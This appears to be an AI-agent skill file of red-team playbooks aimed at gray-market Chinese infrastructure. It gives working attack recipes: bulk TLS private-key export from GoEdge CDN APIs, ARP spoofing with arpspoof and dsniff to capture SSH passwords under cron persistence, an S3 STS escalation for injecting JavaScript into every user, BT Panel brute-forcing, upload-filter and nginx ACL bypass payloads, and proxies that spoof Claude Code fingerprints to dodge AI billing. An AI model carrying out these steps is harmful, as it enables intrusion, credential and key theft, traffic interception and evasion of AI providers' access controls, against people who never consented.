---
name: specialized-attack-playbooks
description: >-
  Specialized exploitation: GoEdge private-key export, gray-market CDN forensics, ARP MITM, CDN→S3 STS chain,
  BT Panel + UniApp, AI IDE API reverse proxy, OCS + MinIO; includes references/scripts support-file index.
  Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, red-team]
---

## Specialized Exploitation Playbooks (fully inline)

### GoEdge CDN (port 8002) bulk private-key export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig only checks identity, not scope → any admin key can export all system TLS private keys (keyData=plaintext PEM base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          subsequent requests carry Header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64 decode → json → dnsNames + keyData(base64 PEM private key) | skip b64=="bnVsbA=="(null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private keys→MITM/traffic decryption/forged certificates | AK/SK credential reuse against other GoEdge instances | admin access to CDN edge nodes
```

### Gray-market CDN post-exploitation forensics (after taking over a CDN, determine what it operates)
```
Five steps: ① fully enumerate certificates (IDs 1-500; expired/disabled ones also contain private keys, revealing historical operations) ② initial classification by keyword ③ real-access verification (critical! do not trust certificate domains alone;
      requests follow redirects and inspect the final landing page title/meta/h1/JS redirects) ④ reclassify by actual content ⑤ tag high-value targets
Keyword matrix (dnsNames classification): wallet phishing tokenpocket/tokenpoket(letter-swap typosquatting)/metamask/trust | payment fraud paypal/wxpay/bayspay/147pay
  adult paid site networks xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated film/TV 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | mass site-network SEO 0x000/tc7/vn00/fc000/ikkk(programmatic wildcard-resolution redirect chains) | lottery fraud 0149/dh49/999pian(pian=scam)
High-value tagging: A-tier wallet/payment private keys within validity→MITM/HTTPS phishing green lock | B-tier ACME auto-renewed certificates for continuous monitoring | C-tier AK/SK credential reuse + WHOIS correlation to other operator assets
Identifying characteristics (🔴 extremely high): same server co-hosts legitimate + adult + pirated content | large numbers of wildcard certificates for mass site networks | brand domain + impersonation domain on the same CDN (insider-run phishing) | a single admin key can export all private keys (GoEdge has no isolation by default)
```

### ARP MITM to steal SSH passwords on the same L2 (target on the same subnet, password unknown)
```
Applicability: target on the same L2 (same Hyper-V host/same VLAN) + a controlled jump box + unknown target SSH password
🚨Key pitfall: arpspoof reports "couldn't arp for host" (libnet MAC resolution often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace TARGET_IP lladdr TARGET_MAC dev eth0 nud permanent (pre-fill the gateway the same way) → skip libnet resolution, and arpspoof works normally
Deployment: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4 bidirectional (one process per direction target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host target
  dsniff -i eth0 -w /tmp/dsniff.log (specifically captures plaintext SSH/FTP/HTTP passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' to fill gaps + rc.local startup
Verification: pgrep -c arpspoof==4 | tcpdump -r x.pcap to see whether target traffic is captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (notify only when there is a catch: the script detects new content in the dsniff log→stdout output→delivery; silent when there is no new content)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove mitm lines from crontab | ip neigh del each entry | rm pcap/log
```

### Multi-layer domain-rotation CDN anti-blocking system → S3 STS credential escalation attack chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → real business site (static landing)
  CDN characteristics: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS scheduling (returns 0.0.0.0 overseas)
  Key breakthrough points:
    ① The real business site's inline HTML JS exposes the mainDomains list (layer by layer) + base64-encoded subsite redirect configuration
    ② The deepest landing page references resources from the CDN's external origin (ug458.com/idcpc8.com, etc.)→ bypass the CDN and hit the origin directly
    ③ The origin is S3 (AmazonS3 header/ListBucket public) → exposes the bucket name
    ④ The same site offers an APK download → reverse it to extract the API domain + AES key + STS acquisition path
    ⑤ Register→log in→JWT→/BBS/GetSTSToken → AWS STS temporary credentials (PutObject permission)
    ⑥ S3 write = CDN origin tampering = JS injection for all users (equivalent to RCE)
  
  Technical details:
    AES-CBC encrypted API communication: the key is exposed in both the frontend JS (lazyDecryptImg.js) and the APK (.so strings)
    ASP.NET backend: determine from validation error format + traceId | form-urlencoded first (JSON may return 415)
    Registration without verification: no SMS/no captcha/any phone number → bulk registration possible
    STS over-authorization: ordinary user role obtains s3:PutObject → overwrite CDN origin files
    S3 bucket ListBucket public: the prefix parameter is ineffective (CDN cache), but connecting directly to the S3 domain allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel penetration + UniApp/DCloud APK reverse engineering
```
=== BT Panel fingerprinting ===
Fingerprint: port 19362/8888/random high port + Cookie name containing a 32-character MD5 hash + "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in a 404 response = confirmed BT Panel; port 888 usually hosts phpMyAdmin (403=IP allowlist)
Security entrance: new BT Panel versions force a random 8-character path (/xxxxxxxx/); without guessing it you cannot enter the panel. All API endpoints are behind the security-entrance path.
  Brute-force strategy: domain-related variants (bt+domain prefix) + common ops habits (admin888/bt123456/btpanel) + 8-character random (extremely low success rate)
  Bypass: no known universal bypass (2024+); old CVE-2023-38038 (phpmyadmin unauthenticated) only <=7.7
  Lateral thinking: multiple sites on the same IP share BT Panel → compromise a weak site → pivot to the target site; BT Panel's default www user manages all sites

=== UniApp/DCloud APK reverse engineering (extremely efficient) ===
Identify: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: all business logic is in the JS/Vue files under assets/apps/<appid>/www/ (no need to decompile Java with jadx)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL/apiUrl/request configuration
  Authentication: search for token/key/secret/Authorization → hardcoded credentials are common in config.js/env.js/manifest.json
  Encryption: search for aes/encrypt/decrypt/sign → frontend encryption = plaintext (the key must be in the JS)
  WebSocket: search for wss://ws:// → real-time communication backend address
Priority: manifest.json (appid/version/permissions) → config or env-related JS (API addresses) → page JS (business logic/IDOR)

=== ChengZi site builder (ChengZi/d3504.cn) SDK decryption ===
Scenario: pornographic/gray-market APP distribution landing pages commonly use ChengZi for no-fill invitations + redirects + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decryption: base64url_decode → XOR each byte with 0x96 → JSON (contains fu=download URL, ph=installer path, fm=redirect method)
  Script: scripts/chengzi_decrypt.py
Exploitation: decrypt to obtain the real APK's Alibaba Cloud FC function URL → download the APK → reverse it to extract the backend API
```

### AI IDE API reverse proxy/key-leak directory (discover and evaluate AI coding tool reverse-proxy schemes)
```
Background: Cursor Web free API only has gemini-3-flash left since 2026-04; all Claude models were cut → getting Claude 4.6+ requires other channels
Available schemes: freemodel-cc-proxy (free, FreeModel real Claude, disguises Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC to API, 100+ models, account-pool rotation)
  askalf/dario (Claude Pro/Max subscription to API, bypasses headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates multiple reverse-engineered interfaces into OpenAI format)
Deprecated: cursor2api/cursor2api-go (only gemini-3-flash left) | Auxiliary: claude-tap (MITM intercepts real AI Agent traffic to study system prompts/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter desc → /repos/<o>/<r>/readme (base64 decode to read) → /search/issues for the latest status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS online customer-service system penetration + MinIO object-storage exploitation
```
Discovery entry: the landing page HTML customer-service link exposes the OCS domain (e.g. leiyushan.com) → Playwright loads the SPA and intercepts real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests header x-v-token: <token>
Core API: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (get upload signature) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Request headers: sign=<sn>, expTime=<et>  Form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blocklist bypass (extensions outside the allowlist are blocked):
  ✓ .jsp.jpg (double extension, the last ext passes detection) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage = static objects, not executed by Tomcat (RCE requires writing into the webroot)
  Verification: curl https://UL/bucket/dir/date/filename → returns file content (plain text, not executed)
dir parameter traversal: the sign service does not validate dir content (always returns a fixed bucket signature); the upload service checks bucket permissions
  dir=conf → 500 (attempts to write to the conf bucket but permission is insufficient) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in new versions (returns BadRequest without leaking env)
CDN layer identification (response-size fingerprint):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) only allow GET → POST returns 405
WSCN (ChinaNetCenter) CDN JS challenge: Playwright passes automatically | path allowlist is independent of the JS challenge (after passing the challenge, path ACLs still block)
Spring Boot path traversal: /c/..;/path → bypass nginx path ACL to reach Spring Boot (semicolon = Tomcat path-parameter truncation)
BT Panel entrance: Set-Cookie leaks the cookie name → the entrance path is a random 8 characters and cannot be derived; brute-force enumeration only
Longteng CDN: TLS certificate exposes all associated domains | Server header exposes origin OS version
```

## Support File Index

```
=== references/ attack-chain writeups ===
cdn-antiblock-s3-attack-chain.md        Multi-layer domain-rotation CDN anti-blocking→S3 STS credential escalation chain
faka-system-attack-chain.md             Card-selling system (XHFAKA/Xinghai) enumeration/second-order XSS/lockout bypass/WAF blind spots
ocs-im-system-attack-chain.md           Complete OCS online customer-service IM system attack chain
ocs-minio-upload-attack-chain.md        OCS upload→MinIO object-storage exploitation chain
chinese-app-distribution-pentest.md     Chinese gray-market APP distribution landing-page penetration (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/ChinaNetCenter response-filter bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypasses CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP authorization bypass + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication + unauthorized subscription

=== references/ nginx/PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO bypass of deny + response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM fingerprint differential
nginx-404-differential-fingerprinting.md   catch-all vs real-404 differential enumeration

=== references/ APK reverse engineering ===
uniapp-apk-reverse-engineering.md       Complete UniApp/DCloud reverse engineering (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reversing quick reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting + entrance brute force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + string-array rotation deobfuscation (extract→node decode)
chengzi_decrypt.py          ChengZi site-builder init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary-credential exploitation (validate/list/write/permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass+auth+injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription/send
```
